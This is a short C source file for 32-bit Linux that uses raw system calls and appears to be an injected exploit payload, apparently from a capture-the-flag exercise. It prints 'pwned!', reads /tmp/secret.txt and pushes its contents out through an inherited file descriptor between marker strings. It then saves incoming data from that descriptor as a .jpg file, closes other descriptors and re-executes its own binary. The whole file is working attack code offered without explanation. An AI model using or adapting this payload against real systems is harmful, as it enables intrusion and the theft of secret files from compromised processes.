typedef unsigned int u32;

static inline int sys(int n, int a, int b, int c)
{
    int r;
    __asm__ volatile("int $0x80" : "=a"(r) : "a"(n), "b"(a), "c"(b), "d"(c) : "memory");
    return r;
}

void _start(void)
{
    volatile char msg[] = "pwned!";
    volatile char secpath[] = "/tmp/secret.txt";
    volatile char out[] = "5-kocicek.jpg";
    volatile char exe[] = "/proc/self/exe";
    volatile char mstart[] = ">>>SECRET<<<";
    volatile char mend[] = ">>>END<<<";
    char buf[0x200];
    int i;

    sys(4, 1, (int)msg, 6);
    int fd = sys(5, (int)secpath, 0, 0);
    sys(4, 5, (int)mstart, 12);
    for (;;) {
        int n = sys(3, fd, (int)buf, sizeof(buf));
        if (n <= 0)
            break;
        sys(4, 1, (int)buf, n);
        sys(4, 5, (int)buf, n);
    }
    sys(4, 5, (int)mend, 9);

    int ofd = sys(5, (int)out, 0x241, 0x1a4);
    for (;;) {
        int n = sys(3, 5, (int)buf, sizeof(buf));
        if (n == 0)
            break;
        if (n < 0)
            continue;
        sys(4, ofd, (int)buf, n);
    }

    for (i = 3; i < 0x1f; i++)
        sys(6, i, 0, 0);

    char *argv[2] = {(char *)exe, 0};
    sys(11, (int)exe, (int)argv, 0);
    sys(1, 0, 0, 0);
}
